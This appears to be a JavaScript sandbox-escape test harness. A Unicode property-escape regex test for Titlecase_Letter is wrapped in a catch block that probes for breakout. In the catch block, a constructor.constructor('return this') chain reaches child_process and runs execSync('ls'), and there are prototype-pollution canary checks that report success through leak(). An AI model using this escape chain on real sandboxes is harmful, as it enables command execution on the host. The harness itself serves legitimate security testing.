try {
    const matchSymbols = buildString({
        loneCodePoints: [
            453,
            456,
            459,
            498,
            8124,
            8140,
            8188
        ],
        ranges: [
            [
                8072,
                8079
            ],
            [
                8088,
                8095
            ],
            [
                8104,
                8111
            ]
        ]
    });
    testPropertyEscapes(/^\p{General_Category=Titlecase_Letter}+$/u, matchSymbols, '\\p{General_Category=Titlecase_Letter}');
    testPropertyEscapes(/^\p{General_Category=Lt}+$/u, matchSymbols, '\\p{General_Category=Lt}');
    testPropertyEscapes(/^\p{gc=Titlecase_Letter}+$/u, matchSymbols, '\\p{gc=Titlecase_Letter}');
    testPropertyEscapes(/^\p{gc=Lt}+$/u, matchSymbols, '\\p{gc=Lt}');
    testPropertyEscapes(/^\p{Titlecase_Letter}+$/u, matchSymbols, '\\p{Titlecase_Letter}');
    testPropertyEscapes(/^\p{Lt}+$/u, matchSymbols, '\\p{Lt}');
    const nonMatchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                56320,
                57343
            ],
            [
                0,
                452
            ],
            [
                454,
                455
            ],
            [
                457,
                458
            ],
            [
                460,
                497
            ],
            [
                499,
                8071
            ],
            [
                8080,
                8087
            ],
            [
                8096,
                8103
            ],
            [
                8112,
                8123
            ],
            [
                8125,
                8139
            ],
            [
                8141,
                8187
            ],
            [
                8189,
                56319
            ],
            [
                57344,
                1114111
            ]
        ]
    });
    testPropertyEscapes(/^\P{General_Category=Titlecase_Letter}+$/u, nonMatchSymbols, '\\P{General_Category=Titlecase_Letter}');
    testPropertyEscapes(/^\P{General_Category=Lt}+$/u, nonMatchSymbols, '\\P{General_Category=Lt}');
    testPropertyEscapes(/^\P{gc=Titlecase_Letter}+$/u, nonMatchSymbols, '\\P{gc=Titlecase_Letter}');
    testPropertyEscapes(/^\P{gc=Lt}+$/u, nonMatchSymbols, '\\P{gc=Lt}');
    testPropertyEscapes(/^\P{Titlecase_Letter}+$/u, nonMatchSymbols, '\\P{Titlecase_Letter}');
    testPropertyEscapes(/^\P{Lt}+$/u, nonMatchSymbols, '\\P{Lt}');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}